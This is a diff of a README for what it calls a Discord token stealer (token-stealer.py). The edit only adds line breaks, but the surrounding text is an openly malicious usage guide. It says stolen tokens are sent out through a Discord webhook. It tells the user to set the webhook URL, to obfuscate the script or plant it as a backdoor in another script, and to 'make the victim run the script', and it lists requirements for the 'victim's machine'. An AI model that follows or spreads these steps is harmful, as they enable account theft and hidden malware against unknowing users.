@@ -6,15 +6,21 @@
  - Transferring via Discord webhook
  - No external Python modules needed (**TODO**)
 
+<br>
+
 # How to use
  1. Create a webhook on your Discord server. I recommend creating a new server.
  2. Change the 'WEBHOOK_URL' variable in [token-stealer.py](token-stealer.py)
  3. (obfuscate the code or install it as a backdoor in an other script.)
  4. Make the victim run the script.
 
+<br>
+
 # Requirements on Victim's Machine
 - Python 3.x
 - 'discord_webhook' PIP module
+
+<br>
 
 # Author
 - **WodX**
